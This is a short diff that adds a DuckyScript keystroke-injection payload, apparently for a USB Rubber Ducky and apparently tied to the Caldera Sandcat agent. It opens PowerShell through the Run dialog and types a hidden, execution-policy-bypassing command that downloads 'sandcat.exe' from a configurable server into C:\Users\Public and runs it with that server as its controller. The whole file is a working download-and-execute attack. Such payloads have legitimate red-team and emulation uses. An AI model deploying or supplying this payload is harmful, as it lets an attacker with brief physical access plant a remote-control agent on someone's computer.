@@ -1,0 +1,11 @@
+STRING $server=""
+DEFAULT_DELAY 150
+DELAY 300
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 300
+STRING powershell.exe -W Hidden -ExecutionPolicy Bypass {$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server $server -group my_group;}
+ENTER
+DELAY 1500
